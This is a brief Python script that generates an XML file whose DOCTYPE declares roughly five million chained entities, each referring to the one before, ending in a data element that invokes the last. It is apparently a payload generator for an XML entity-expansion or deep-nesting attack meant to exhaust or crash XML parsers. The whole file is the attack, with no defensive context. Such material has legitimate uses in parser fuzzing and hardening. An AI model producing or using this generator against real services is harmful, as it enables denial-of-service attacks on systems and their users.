my_file = open("entity.xml", "r+")

my_file.write("<!DOCTYPE data [")
my_file.write("<!ENTITY a0 'a'>")
for i in range (1,5000000):
    my_file.write("<!ENTITY a" + str(i) + " '&a"+ str(i-1) + ";'>" + "\n")

my_file.write("]>")

my_file.write("<data>&a" + str(i-1) + ";</data>")

	
my_file.close()
